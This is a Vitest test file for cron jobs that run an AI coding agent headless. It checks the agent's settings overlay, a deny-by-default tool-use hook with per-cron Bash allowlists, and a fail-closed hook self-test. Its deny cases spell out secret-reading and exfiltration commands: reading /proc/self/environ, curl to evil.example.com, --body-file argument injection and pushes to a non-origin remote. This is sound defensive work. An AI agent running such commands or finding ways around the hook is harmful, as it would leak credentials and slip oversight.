// #4689 follow-on — git-clone-128 was undiagnosable because spawnSimple
// discarded the child's stderr (`stdio: "ignore"`). When setupEphemeralWorkspace
// throws `git clone failed (exit 128, ...)`, the actual git reason
// (auth/network/DNS) never reached Sentry. This file pins that spawnSimple now
// returns the child's captured stderr alongside the exit code (real-spawn,
// offline: a bogus git subcommand writes usage to stderr).
//
// The security-critical redaction of the installation token out of the thrown
// clone-failure error is tested in cron-clone-redaction.test.ts (separate file
// because it `vi.mock`s node:child_process, which hoists file-wide and would
// clobber the real-spawn calls below).

import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";

vi.hoisted(() => {
  process.env.NEXT_PHASE = "phase-production-build";
});

import { resolveCronWorkspaceRoot } from "@/server/inngest/functions/_cron-shared";
import { decide } from "@/server/inngest/cron-bash-allowlist-hook.mjs";
import {
  buildCronEvalSettings,
  CRON_BASH_ALLOWLISTS,
  CRON_MCP_ALLOWLISTS,
  DEFAULT_CLAUDE_SETTINGS,
  ISSUE_CREATOR_BASH_ALLOWLIST,
  parseClaudeResultLine,
  resolveEvalCaptureStatus,
  runHookSelfTest,
  spawnClaudeEval,
  spawnSimple,
  STDOUT_TAIL_CAP_BYTES,
} from "@/server/inngest/functions/_cron-claude-eval-substrate";
import { classifyEvalFatal } from "@/server/inngest/functions/_cron-shared";

// #4684/#4689 — crons mkdtemp'd under os.tmpdir() (the 256 MB /tmp tmpfs in
// prod), so a git clone of the ~100 MB soleur tree ENOSPC'd. The fix routes the
// ephemeral-workspace parent through resolveCronWorkspaceRoot(), which prod sets
// to /workspaces (the roomy /mnt/data volume) via CRON_WORKSPACE_ROOT. This
// block pins the pure env→string resolution (the clone itself is not the unit
// under test); the docker-run wiring is asserted in ci-deploy.test.sh.
describe("resolveCronWorkspaceRoot", () => {
  const ORIGINAL = process.env.CRON_WORKSPACE_ROOT;
  afterEach(() => {
    if (ORIGINAL === undefined) delete process.env.CRON_WORKSPACE_ROOT;
    else process.env.CRON_WORKSPACE_ROOT = ORIGINAL;
  });

  it("returns CRON_WORKSPACE_ROOT when set", () => {
    process.env.CRON_WORKSPACE_ROOT = "/workspaces";
    expect(resolveCronWorkspaceRoot()).toBe("/workspaces");
  });

  it("falls back to os.tmpdir() when the env var is unset", () => {
    delete process.env.CRON_WORKSPACE_ROOT;
    expect(resolveCronWorkspaceRoot()).toBe(tmpdir());
  });

  it("falls back to os.tmpdir() when the env var is whitespace-only", () => {
    process.env.CRON_WORKSPACE_ROOT = "   ";
    expect(resolveCronWorkspaceRoot()).toBe(tmpdir());
  });

  it("trims surrounding whitespace from a set value", () => {
    process.env.CRON_WORKSPACE_ROOT = "  /workspaces  ";
    expect(resolveCronWorkspaceRoot()).toBe("/workspaces");
  });
});

// #5000/#5004 (v3.1) — the cron eval substrate writes the settings overlay into
// each ephemeral workspace's `.claude/settings.json`. `sandbox.enabled:false`
// is the host-independence fix (immune to bwrap-userns drift); containment is
// the deny-by-default PreToolUse hook (cron-bash-allowlist-hook.mjs), NOT the
// permission mode (Phase-0 proved --allowedTools/defaultMode fail-OPEN headless).
// The v1 `bypassPermissions` was P1-blocked as an exfil primitive and must never
// reappear. These tests assert the WRITTEN settings shape (config invariant),
// keeping the LLM out of the assertion path.
describe("cron eval overlay — hook-primary containment (#5018/#5000/#5004)", () => {
  const base = JSON.parse(JSON.stringify(DEFAULT_CLAUDE_SETTINGS, null, 2) + "\n");
  const built = buildCronEvalSettings("/tmp/ephemeral/repo") as {
    sandbox: { enabled: boolean };
    permissions: { allow: string[]; defaultMode: string };
    hooks: { PreToolUse: Array<{ matcher: string; hooks: Array<{ command: string }> }> };
  };

  it("disables the OS sandbox so a bwrap-userns host drift cannot break the cron", () => {
    expect(base.sandbox.enabled).toBe(false);
  });

  it("NEVER uses bypassPermissions (the v1 P1-blocked exfil primitive)", () => {
    expect(JSON.stringify(DEFAULT_CLAUDE_SETTINGS)).not.toContain("bypassPermissions");
    expect(JSON.stringify(built)).not.toContain("bypassPermissions");
  });

  it("keeps permissions.allow empty (the hook, not the allowlist, is the control)", () => {
    expect(base.permissions.allow).toEqual([]);
  });

  it("registers the deny-by-default hook under a '*' catch-all matcher (no unhooked tool class)", () => {
    const pre = built.hooks.PreToolUse;
    expect(pre).toHaveLength(1);
    expect(pre[0].matcher).toBe("*");
    expect(pre[0].hooks[0].command).toContain("cron-bash-allowlist-hook.mjs");
    expect(pre[0].hooks[0].command).toContain(".claude/cron-allow.txt");
  });

  it("the hook command is fully absolute (CWD-independent — no PATH-drift fail-open)", () => {
    const cmd = built.hooks.PreToolUse[0].hooks[0].command;
    // node binary + hook path + allowlist path, all rooted at the spawn cwd
    expect(cmd).toContain("/tmp/ephemeral/repo/apps/web-platform/server/inngest/");
    expect(cmd).toContain("/tmp/ephemeral/repo/.claude/cron-allow.txt");
  });

  it("regression: sandbox stays off AND the hook stays registered", () => {
    expect(DEFAULT_CLAUDE_SETTINGS.sandbox.enabled).toBe(false);
    expect(built.hooks.PreToolUse[0].matcher).toBe("*");
  });

  it("roadmap-review (#5004) is a Tier-1 cron with a finite Bash allowlist", () => {
    const allow = CRON_BASH_ALLOWLISTS["cron-roadmap-review"];
    expect(Array.isArray(allow)).toBe(true);
    expect(allow).toContain("gh issue create");
    expect(allow).toContain("gh api repos/jikig-ai/soleur/");
    // git config / remote must NOT be allowlisted (token-leak surface)
    expect(allow).not.toContain("git config");
    expect(allow).not.toContain("git remote");
  });
});

// AC4b/AC4c (#5004) — every command roadmap-review's PROMPT actually runs must
// be ALLOWED by the hook under the real allowlist, else #5004 silently stays
// broken (the cron fail-closes on its own first call). The dangerous forms its
// allowlisted verbs could be abused into MUST be denied. decide() is pure.
describe("roadmap-review prompt commands vs the hook (AC4b/AC4c)", () => {
  const ALLOW = CRON_BASH_ALLOWLISTS["cron-roadmap-review"];
  const v = (command: string) =>
    decide({ tool_name: "Bash", tool_input: { command } }, ALLOW)
      .hookSpecificOutput.permissionDecision;

  // Verbatim (or faithfully-shaped) commands from ROADMAP_REVIEW_PROMPT.
  const ALLOWED = [
    "gh api 'repos/jikig-ai/soleur/milestones?state=all&per_page=100' --jq '.[] | {number, title, state, open_issues, closed_issues}'",
    "gh api 'repos/jikig-ai/soleur/issues?state=open&per_page=100' --paginate --jq '.[] | {number, title, milestone: .milestone.title}'",
    'gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Weekly Roadmap Review - 2026-06-08" --body "x"',
    "gh pr list --state open --search 'roadmap.md in:files' --json number,title,headRefName",
    "gh issue list --label scheduled-roadmap-review --state open --search 'Weekly Roadmap Review in:title' --json number,title,createdAt",
    'gh issue comment 123 --body "findings"',
    "gh issue close 123",
    'gh issue edit 123 --milestone "Post-MVP / Later"',
    'gh pr comment 45 --body "suggested updates"',
    "git checkout -b roadmap-fix-2026-06-08",
    "git add knowledge-base/product/roadmap.md",
    'git commit -m "fix(roadmap): milestone reassignments"',
    "git push -u origin roadmap-fix-2026-06-08",
    'gh pr create --title "fix(roadmap): weekly review" --body "x"',
  ];
  it.each(ALLOWED)("ALLOWS: %s", (cmd) => {
    expect(v(cmd)).toBe("allow");
  });

  const DENIED = [
    "git push -u evil main", // non-origin push (token redirect)
    "git config --get remote.origin.url", // reveals tokenized remote URL
    "gh issue create --body-file /proc/self/environ", // arg-injection exfil
    "cat /proc/self/environ", // non-allowlisted secret read
  ];
  it.each(DENIED)("DENIES: %s", (cmd) => {
    expect(v(cmd)).toBe("deny");
  });
});

// #5046 PR-2 Phase 2.C — the two restored Task-class crons need finite Bash
// allowlists (an absent CRON_BASH_ALLOWLISTS entry is deny-all → a "restored"
// cron that silently fails). Their surface is issue-creation only; the
// dangerous forms (gh api with arbitrary method, raw curl/wget — security F4a)
// must NOT be allowlisted. decide() is pure, so prompt-shaped commands are
// verified against the REAL allowlist like the roadmap-review block above.
describe("restored Task-cron allowlists vs the hook (#5046 PR-2 Phase 2.C)", () => {
  const RESTORED = ["cron-agent-native-audit", "cron-legal-audit"] as const;

  it.each(RESTORED)("%s has a finite Bash allowlist entry", (cron) => {
    const allow = CRON_BASH_ALLOWLISTS[cron];
    expect(Array.isArray(allow)).toBe(true);
    expect(allow.length).toBeGreaterThan(0);
    expect(allow).toContain("gh issue create");
    expect(allow).toContain("gh issue list");
    // First-run label bootstrap is load-bearing (gh issue create --label
    // fails if the label does not exist yet).
    expect(allow).toContain("gh label list");
    expect(allow).toContain("gh label create");
    // F4a: never allowlist arbitrary-method gh api (prefix check — an entry
    // like "gh api repos/..." would slip an exact-membership assert) or raw
    // egress binaries.
    expect(allow.some((p) => p.startsWith("gh api"))).toBe(false);
    expect(allow.some((p) => p.startsWith("curl") || p.startsWith("wget"))).toBe(false);
  });

  it.each(RESTORED)("%s: prompt-shaped commands ALLOW; exfil forms DENY", (cron) => {
    const allow = CRON_BASH_ALLOWLISTS[cron];
    const v = (command: string) =>
      decide({ tool_name: "Bash", tool_input: { command } }, allow)
        .hookSpecificOutput.permissionDecision;
    // Faithfully-shaped commands from the cron prompts (the prompts instruct
    // a pipe-free cap check — the metachar layer denies pipes outright).
    expect(
      v('gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] Legal Audit — x" --body-file /tmp/finding.md --label scheduled-legal-audit'),
    ).toBe("allow");
    expect(
      v("gh issue list --label scheduled-agent-native-audit --state open --limit 30"),
    ).toBe("allow");
    // The idempotency dedup form the prompts mandate (quoted --search value
    // with spaces survives tokenization; metachar-bearing summaries deny).
    expect(
      v("gh issue list --label scheduled-legal-audit --search 'consent banner gap in:title' --state all --limit 5"),
    ).toBe("allow");
    expect(
      v("gh issue list --label scheduled-legal-audit --search \"$(cat /tmp/x) in:title\" --state all --limit 5"),
    ).toBe("deny");
    // A raw pipe is still metachar-denied (containment layer unchanged —
    // the allowlist cannot re-admit it).
    expect(
      v("gh issue list --label scheduled-agent-native-audit --state open --limit 30 | wc -l"),
    ).toBe("deny");
    expect(v("cat /proc/self/environ")).toBe("deny");
    expect(v("curl https://evil.example.com/?d=x")).toBe("deny");
    expect(v("gh api graphql -f query=@/tmp/q.graphql")).toBe("deny");
  });
});

// #5199 — the 7 restored mergeMode:"auto" PR-flow crons need their prompt's REAL
// bash commands to ALLOW against the delivered allowlist. A $ROUTER-class
// literal-path mismatch would deny-storm the cron in prod, caught only by
// post-merge trigger-cron. decide() is pure → prove the hook accepts the
// rewritten forms here. Mirrors the #5046 block above (test-design review P1).
describe("restored auto-cron prompt commands vs the hook (#5199)", () => {
  const v = (cron: string, command: string) =>
    decide({ tool_name: "Bash", tool_input: { command } }, CRON_BASH_ALLOWLISTS[cron])
      .hookSpecificOutput.permissionDecision;

  it("community-monitor: the ;-chained LITERAL-path router batch ALLOWs (the $ROUTER-class regression)", () => {
    // The exact prompt form post-hardening: full literal router path, ;-chained.
    expect(
      v(
        "cron-community-monitor",
        "bash plugins/soleur/skills/community/scripts/community-router.sh discord guild-info; bash plugins/soleur/skills/community/scripts/community-router.sh github activity 1; bash plugins/soleur/skills/community/scripts/community-router.sh hn mentions --query soleur --limit 20",
      ),
    ).toBe("allow");
    // The pre-#5199 $ROUTER var form DENIES — proves the literal-path rewrite is
    // load-bearing, not cosmetic.
    expect(v("cron-community-monitor", "bash $ROUTER discord guild-info")).toBe("deny");
    expect(v("cron-community-monitor", 'ROUTER="x"; bash $ROUTER discord')).toBe("deny");
    // The dedup-staleness read the prompt now uses (gh api was hook-denied).
    expect(
      v("cron-community-monitor", "gh issue list --label scheduled-community-monitor --json updatedAt,number"),
    ).toBe("allow");
  });

  it("each restored auto-cron's gh issue create + dedup list ALLOW; exfil forms DENY", () => {
    const RESTORED = [
      "cron-growth-audit", "cron-growth-execution", "cron-competitive-analysis",
      "cron-seo-aeo-audit", "cron-content-generator", "cron-campaign-calendar",
      "cron-community-monitor",
    ];
    for (const cron of RESTORED) {
      expect(
        v(cron, 'gh issue create --milestone "Post-MVP / Later" --title "[Scheduled] x" --body-file /tmp/finding.md --label scheduled-x'),
      ).toBe("allow");
      expect(v(cron, "gh issue list --label scheduled-x --state all --limit 5")).toBe("allow");
      // F4a + metachar layer: gh api, command substitution, raw curl all DENY.
      expect(v(cron, "gh api repos/jikig-ai/soleur/issues")).toBe("deny");
      expect(v(cron, 'gh issue list --search "$(cat /tmp/x)"')).toBe("deny");
      expect(v(cron, "cat /proc/self/environ")).toBe("deny");
    }
  });

  it("bespoke verbs ALLOW only for the crons that need them (scoping)", () => {
    // campaign-calendar dedup-comments + closes a heartbeat issue.
    expect(v("cron-campaign-calendar", "gh issue comment 123 --body-file /tmp/c.md")).toBe("allow");
    expect(v("cron-campaign-calendar", "gh issue close 123")).toBe("allow");
    // growth-audit dedup/tracking needs view + edit.
    expect(v("cron-growth-audit", "gh issue view 123 --json body")).toBe("allow");
    expect(v("cron-growth-audit", "gh issue edit 123 --add-label x")).toBe("allow");
    // A pure issue-creator cron must NOT inherit the bespoke verbs.
    expect(v("cron-content-generator", "gh issue close 123")).toBe("deny");
    expect(v("cron-content-generator", "gh issue edit 123 --add-label x")).toBe("deny");
  });
});

// #5199 (final) — cron-bug-fixer restore. The LAST cron and the highest blast
// radius: it WRITES code and opens bot-fix/* PRs against the live auto-deploying
// repo. Its commit lives in the fix-issue SKILL (not safeCommitAndPr), so it
// uniquely carries git/gh-pr PERSISTENCE verbs. The decide-paired test is
// load-bearing: a membership/parity test alone is vacuous-green against a runtime
// DENY (the $ROUTER-class trap). The fix-issue SKILL was rewritten (Phase 3.5) to
// emit ONLY these literal forms — no $VAR, no $(...), no pipe/redirect, no eval,
// no node -e.
describe("restored cron-bug-fixer prompt commands vs the hook (#5199 final)", () => {
  const v = (command: string) =>
    decide({ tool_name: "Bash", tool_input: { command } }, CRON_BASH_ALLOWLISTS["cron-bug-fixer"])
      .hookSpecificOutput.permissionDecision;

  it("the literal git/gh/test prompt forms the SKILL emits ALLOW", () => {
    expect(v("gh issue view 4321 --json state,title,body,labels")).toBe("allow");
    expect(v('gh issue comment 4321 --body "Bot Fix Attempted"')).toBe("allow");
    expect(v('gh issue edit 4321 --add-label bot-fix/attempted')).toBe("allow");
    expect(v('gh pr create --title "[bot-fix] x" --body-file pr-body.md')).toBe("allow");
    expect(v("gh pr edit 99 --add-label bot-fix/auto-merge-eligible")).toBe("allow");
    expect(v("git status --porcelain")).toBe("allow");
    expect(v("git add -- src/foo.ts test/foo.test.ts")).toBe("allow");
    expect(v('git commit -m "[bot-fix] Fix #4321"')).toBe("allow");
    expect(v("git checkout -b bot-fix/4321-foo origin/main")).toBe("allow");
    expect(v("git worktree add .worktrees/bot-fix-4321-foo -b bot-fix/4321-foo origin/main")).toBe("allow");
    expect(v("git branch -D bot-fix-4321-foo")).toBe("allow");
    expect(v("git push -u origin bot-fix/4321-foo")).toBe("allow");
    expect(v("bash plugins/soleur/skills/git-worktree/scripts/worktree-manager.sh --yes create bot-fix-4321-foo")).toBe("allow");
    expect(v("./node_modules/.bin/vitest run --root apps/web-platform")).toBe("allow");
    // #5199 review — Phase 6 (Failure Handler) emitted forms. Phase 6 fires on
    // any failure when the cron runs the WHOLE skill, so its literal forms must
    // also be hook-clean: the failure comment goes via --body-file (multiline
    // --body is denied), and the worktree/branch cleanup drops 2>/dev/null.
    expect(v("gh issue comment 4321 --body-file fix-attempt.md")).toBe("allow");
    expect(v("git worktree remove .worktrees/bot-fix-4321-foo --force")).toBe("allow");
    expect(v("git branch -D bot-fix-4321-foo")).toBe("allow");
  });

  it("exfil / blanket / interpreter / persistence-bypass forms DENY", () => {
    // F4a: arbitrary-method gh api.
    expect(v("gh api repos/jikig-ai/soleur/issues")).toBe("deny");
    // Blanket staging (gitVerbReason) — the SKILL must emit scoped `git add -- <path>`.
    expect(v("git add -A")).toBe("deny");
    expect(v("git add .")).toBe("deny");
    expect(v("git commit -a -m x")).toBe("deny");
    // Non-origin push remote.
    expect(v("git push -u evil main")).toBe("deny");
    // Token-bearing remote URL read/redirect.
    expect(v("git config --get remote.origin.url")).toBe("deny");
    // Interpreters + $VAR indirection (the rewritten SKILL emits none of these).
    expect(v('eval "$TEST_CMD"')).toBe("deny");
    expect(v("TEST=x npm test")).toBe("deny");
    // $(...) substitution, pipe, redirect.
    expect(v('gh issue list --search "$(cat /tmp/x)"')).toBe("deny");
    expect(v("gh issue view 1 | wc -l")).toBe("deny");
    expect(v("gh issue view 1 > /tmp/x")).toBe("deny");
    // Secret read.
    expect(v("cat /proc/self/environ")).toBe("deny");
    // gh pr merge is node-side (runAutoMergeGate), never a prompt verb.
    expect(v("gh pr merge --auto")).toBe("deny");
  });

  // #5199 review — prefix-overmatch exfil close. The allowlist carries the
  // prefix `bash …/worktree-manager.sh`; a bare `startsWith(p)` matcher would
  // let a near-miss extension of that path (a sibling exfil script the model
  // Wrote) prefix-match and ALLOW. A match now requires exact-equal OR a
  // trailing-space separator, so only the real script path (with its `--yes
  // create …` args) ALLOWs; the near-miss forms DENY.
  it("near-miss extensions of an allowlisted script path DENY (separator required)", () => {
    expect(
      v("bash plugins/soleur/skills/git-worktree/scripts/worktree-manager.sh-evil"),
    ).toBe("deny");
    expect(
      v("bash plugins/soleur/skills/git-worktree/scripts/evil.sh"),
    ).toBe("deny");
    // the legitimate space-separated form still ALLOWs.
    expect(
      v("bash plugins/soleur/skills/git-worktree/scripts/worktree-manager.sh --yes create bot-fix-1"),
    ).toBe("allow");
  });
});

// AC2c — the spawn-time self-test converts the probe D-new-1 fail-open (a
// crashed/missing hook) into fail-closed: it THROWS (→ cron aborts) rather than
// letting the cron spawn unprotected. Runs the real hook binary via execFileSync.
//
// #5046 PR-2 (AC-P2.2): the self-test now ALSO gates the Tier-2 relax — Task
// must allow, an unknown tool class must still deny, and the spawn's
// settings.json must register the hook under a `*` matcher (the structural
// precondition for sub-agent hook inheritance). The fixtures below build a
// faithful spawn-shaped workspace (real hook at its clone-relative path +
// buildCronEvalSettings output) because the SUT contract is "spawnCwd is a
// real ephemeral spawn workspace".
describe("runHookSelfTest (AC2c fail-closed + AC-P2.2 relax gate)", () => {
  const HOOK_REL = "apps/web-platform/server/inngest/cron-bash-allowlist-hook.mjs";
  // vitest cwd is apps/web-platform; the real hook lives at server/inngest/.
  const REAL_HOOK = join(process.cwd(), "server/inngest/cron-bash-allowlist-hook.mjs");
  const tmpDirs: string[] = [];

  afterEach(() => {
    for (const d of tmpDirs.splice(0)) rmSync(d, { recursive: true, force: true });
  });

  /** Build a spawn-shaped workspace: hook source at its clone-relative path,
   *  .claude/cron-allow.txt, and .claude/settings.json. `hookSource` defaults
   *  to the real hook file; `settings` defaults to buildCronEvalSettings. */
  function makeSpawnCwd(opts: {
    hookSource?: string;
    settings?: Record<string, unknown>;
    allow?: string[];
  } = {}): string {
    const spawnCwd = mkdtempSync(join(tmpdir(), "soleur-selftest-"));
    tmpDirs.push(spawnCwd);
    mkdirSync(join(spawnCwd, "apps/web-platform/server/inngest"), { recursive: true });
    writeFileSync(
      join(spawnCwd, HOOK_REL),
      opts.hookSource ?? readFileSync(REAL_HOOK, "utf-8"),
      "utf-8",
    );
    mkdirSync(join(spawnCwd, ".claude"), { recursive: true });
    const allow = opts.allow ?? [];
    writeFileSync(
      join(spawnCwd, ".claude/cron-allow.txt"),
      allow.length ? allow.join("\n") + "\n" : "",
      "utf-8",
    );
    writeFileSync(
      join(spawnCwd, ".claude/settings.json"),
      JSON.stringify(opts.settings ?? buildCronEvalSettings(spawnCwd), null, 2) + "\n",
      "utf-8",
    );
    return spawnCwd;
  }

  /** A stub hook whose decide path is a fixed per-tool verdict map. */
  function stubHook(verdicts: Record<string, "allow" | "deny">, fallback: "allow" | "deny"): string {
    return [
      "#!/usr/bin/env node",
      'import { readFileSync } from "node:fs";',
      `const verdicts = ${JSON.stringify(verdicts)};`,
      `const fallback = ${JSON.stringify(fallback)};`,
      'const input = JSON.parse(readFileSync(0, "utf-8"));',
      "const v = verdicts[input.tool_name] ?? fallback;",
      "process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: \"PreToolUse\", permissionDecision: v } }));",
      "process.exit(0);",
    ].join("\n");
  }

  it("throws when the hook is unreachable (would otherwise fail-open)", () => {
    expect(() =>
      runHookSelfTest({
        spawnCwd: "/tmp/soleur-no-such-spawn-cwd-xyz",
        cronName: "cron-x",
        allow: [],
      }),
    ).toThrow(/self-test FAILED/);
  });

  it("passes against a faithful spawn workspace (real hook + `*`-matcher settings)", () => {
    const spawnCwd = makeSpawnCwd();
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: [] }),
    ).not.toThrow();
  });

  it("passes with a non-empty allowlist (first verb allows)", () => {
    const spawnCwd = makeSpawnCwd({ allow: ["gh issue list"] });
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: ["gh issue list"] }),
    ).not.toThrow();
  });

  it("throws when the delivered hook does NOT allow Task (Tier-2 relax missing)", () => {
    // Deny-all stub: the canonical exfil probe passes (deny), the Task relax
    // probe fails → the self-test must catch a reverted/stale hook.
    const spawnCwd = makeSpawnCwd({ hookSource: stubHook({}, "deny") });
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: [] }),
    ).toThrow(/Task/);
  });

  it("throws when an unknown tool class is ALLOWED (fail-closed catch-all gone)", () => {
    // Stub: denies Bash (exfil probe passes), allows everything else — the
    // unknown-class probe must catch the lost deny-by-default.
    const spawnCwd = makeSpawnCwd({ hookSource: stubHook({ Bash: "deny" }, "allow") });
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: [] }),
    ).toThrow(/fail-closed|unknown/i);
  });

  it("throws when settings.json registers the hook under a NARROWED matcher (sub-agent inheritance precondition)", () => {
    const spawnCwd = mkdtempSync(join(tmpdir(), "soleur-selftest-"));
    tmpDirs.push(spawnCwd);
    mkdirSync(join(spawnCwd, "apps/web-platform/server/inngest"), { recursive: true });
    writeFileSync(join(spawnCwd, HOOK_REL), readFileSync(REAL_HOOK, "utf-8"), "utf-8");
    mkdirSync(join(spawnCwd, ".claude"), { recursive: true });
    writeFileSync(join(spawnCwd, ".claude/cron-allow.txt"), "", "utf-8");
    const narrowed = buildCronEvalSettings(spawnCwd) as {
      hooks: { PreToolUse: Array<{ matcher: string }> };
    };
    narrowed.hooks.PreToolUse[0].matcher = "Bash"; // sub-agent classes unhooked
    writeFileSync(
      join(spawnCwd, ".claude/settings.json"),
      JSON.stringify(narrowed, null, 2) + "\n",
      "utf-8",
    );
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: [] }),
    ).toThrow(/matcher/);
  });

  it("throws when settings.json is missing (registration unverifiable → fail-closed)", () => {
    const spawnCwd = makeSpawnCwd();
    rmSync(join(spawnCwd, ".claude/settings.json"));
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: [] }),
    ).toThrow(/matcher|settings/);
  });

  it("throws when settings.json is MALFORMED (parse failure → fail-closed)", () => {
    const spawnCwd = makeSpawnCwd();
    writeFileSync(join(spawnCwd, ".claude/settings.json"), "{not json", "utf-8");
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: [] }),
    ).toThrow(/matcher/);
  });

  it("throws when the delivered hook does NOT allow Skill (probed separately from Task)", () => {
    // A clone carrying a Task-only intermediate hook would otherwise
    // fail-close every Skill-invoking cron with the Task probe green.
    const spawnCwd = makeSpawnCwd({
      hookSource: stubHook({ Task: "allow" }, "deny"),
    });
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: [] }),
    ).toThrow(/Skill/);
  });

  // --- #5199: mcp__playwright__* relaxation self-test probes ---
  it("passes for an ux-audit-shaped workspace (mcp-allow + navigate-origin delivered)", () => {
    const fileLines = [
      ...ISSUE_CREATOR_BASH_ALLOWLIST,
      "mcp-allow mcp__playwright__browser_navigate",
      "mcp-allow mcp__playwright__browser_take_screenshot",
      "navigate-origin https://app.soleur.ai",
    ];
    const spawnCwd = makeSpawnCwd({ allow: fileLines });
    expect(() =>
      runHookSelfTest({
        spawnCwd,
        cronName: "cron-ux-audit",
        allow: ISSUE_CREATOR_BASH_ALLOWLIST,
        mcpAllow: [
          "mcp__playwright__browser_navigate",
          "mcp__playwright__browser_take_screenshot",
        ],
        navigateOrigin: "https://app.soleur.ai",
      }),
    ).not.toThrow();
  });

  it("throws when mcp policy is expected but the file did NOT deliver the directives (delivery cross-check)", () => {
    // File carries bash prefixes only — no mcp-allow/navigate-origin lines — so
    // the hook denies the app-origin navigate the self-test expects to allow.
    const spawnCwd = makeSpawnCwd({ allow: ISSUE_CREATOR_BASH_ALLOWLIST });
    expect(() =>
      runHookSelfTest({
        spawnCwd,
        cronName: "cron-ux-audit",
        allow: ISSUE_CREATOR_BASH_ALLOWLIST,
        mcpAllow: ["mcp__playwright__browser_navigate"],
        navigateOrigin: "https://app.soleur.ai",
      }),
    ).toThrow(/navigate|mcp/i);
  });

  it("throws when a no-mcp cron's hook ALLOWS WebFetch (egress probe added #5199)", () => {
    // Stub: denies Bash (exfil probe passes) + the unknown-class probe, allows
    // Task/Skill, but allows WebFetch — the new egress probe must catch it.
    const spawnCwd = makeSpawnCwd({
      hookSource: stubHook(
        { Bash: "deny", Task: "allow", Skill: "allow", Tier2FailClosedProbeTool: "deny" },
        "allow",
      ),
    });
    expect(() =>
      runHookSelfTest({ spawnCwd, cronName: "cron-x", allow: [] }),
    ).toThrow(/WebFetch|egress|navigate|fail-closed|unknown/i);
  });
});

describe("spawnSimple — stderr capture (clone-128 diagnosability)", () => {
  it("returns the child's stderr text alongside a non-zero exit code", async () => {
    // A guaranteed-failing git command that writes usage to stderr —
    // deterministic and offline.
    const res = await spawnSimple("git", ["definitely-not-a-git-subcommand"]);
    expect(res.exitCode).not.toBe(0);
    expect(typeof res.stderr).toBe("string");
    expect(res.stderr.length).toBeGreaterThan(0);
  });

  it("returns empty stderr (not undefined) on a clean exit", async () => {
    const res = await spawnSimple("git", ["--version"]);
    expect(res.exitCode).toBe(0);
    expect(res.stderr).toBe("");
  });
});

// #4773 PR-A — `claude --print` writes its max-turns notice to STDOUT, which
// spawnClaudeEval previously sent only to logger.info (app stdout is not shipped
// to Better Stack). These tests pin that spawnClaudeEval now also accumulates a
// bounded, redacted `stdoutTail` so a turn-exhaustion exit is self-diagnosing in
// the scheduled-output-missing Sentry extra — mirroring the stderrTail contract.
// Real-spawn (offline): a fake CLAUDE_BIN script writes known lines to stdout.
describe("spawnClaudeEval — stdout tail capture (#4773 PR-A)", () => {
  const ORIGINAL_CLAUDE_BIN = process.env.CLAUDE_BIN;
  const tmpDirs: string[] = [];
  const noopLogger = {
    info: () => {},
    error: () => {},
    warn: () => {},
    debug: () => {},
  } as unknown as Parameters<typeof spawnClaudeEval>[0]["logger"];

  afterEach(() => {
    if (ORIGINAL_CLAUDE_BIN === undefined) delete process.env.CLAUDE_BIN;
    else process.env.CLAUDE_BIN = ORIGINAL_CLAUDE_BIN;
    for (const dir of tmpDirs.splice(0)) {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  // Build a temp dir holding (a) an executable fake `claude` that runs the given
  // node script body, and (b) a `repo` cwd that exists (spawnClaudeEval guards on
  // existsSync(spawnCwd)). Returns the spawnCwd. Sets CLAUDE_BIN to the fake bin.
  function installFakeClaudeBin(nodeScriptBody: string): string {
    const dir = mkdtempSync(join(tmpdir(), "claude-eval-stdout-"));
    tmpDirs.push(dir);
    const binPath = join(dir, "claude");
    writeFileSync(binPath, `#!/usr/bin/env node\n${nodeScriptBody}\n`, "utf-8");
    chmodSync(binPath, 0o755);
    process.env.CLAUDE_BIN = binPath;
    const spawnCwd = join(dir, "repo");
    mkdirSync(spawnCwd, { recursive: true });
    return spawnCwd;
  }

  const TOKEN = "ghs_FAKEtoken0123456789ABCDEFghijklmnop";

  async function runFakeEval(spawnCwd: string) {
    return spawnClaudeEval({
      spawnCwd,
      installationToken: TOKEN,
      flags: ["--print"],
      prompt: "ignored by the fake bin",
      maxTurnDurationMs: 10_000,
      cronName: "cron-test-fake",
      buildSpawnEnv: () => process.env,
      logger: noopLogger,
    });
  }

  it("captures a stdout tail and redacts the installation token", async () => {
    const spawnCwd = installFakeClaudeBin(
      [
        `process.stdout.write("first stdout line\\n");`,
        // Echo the token on stdout — must be redacted in the captured tail.
        `process.stdout.write("auth line using ${TOKEN} here\\n");`,
        `process.stdout.write("max-turns notice: reached the turn limit\\n");`,
      ].join("\n"),
    );

    const res = await runFakeEval(spawnCwd);

    expect(res.exitCode).toBe(0);
    expect(typeof res.stdoutTail).toBe("string");
    expect(res.stdoutTail).toContain("max-turns notice: reached the turn limit");
    // Token redaction parity with stderrTail.
    expect(res.stdoutTail).toContain("[REDACTED-INSTALLATION-TOKEN]");
    expect(res.stdoutTail).not.toContain(TOKEN);
  });

  it("bounds the captured stdout tail to STDOUT_TAIL_CAP_BYTES (keeps the tail)", async () => {
    const spawnCwd = installFakeClaudeBin(
      [
        // Far exceed the cap so the slice(-CAP) bounding is exercised.
        `for (let i = 0; i < 4000; i++) process.stdout.write("X".repeat(40) + " line " + i + "\\n");`,
        `process.stdout.write("FINAL_TAIL_MARKER\\n");`,
      ].join("\n"),
    );

    const res = await runFakeEval(spawnCwd);

    expect(res.exitCode).toBe(0);
    expect(res.stdoutTail).toBeDefined();
    expect(res.stdoutTail!.length).toBeLessThanOrEqual(STDOUT_TAIL_CAP_BYTES);
    // The bound drops the OLDEST lines, keeping the most recent (the tail).
    expect(res.stdoutTail).toContain("FINAL_TAIL_MARKER");
    expect(res.stdoutTail).not.toContain(" line 0\n");
  });
});

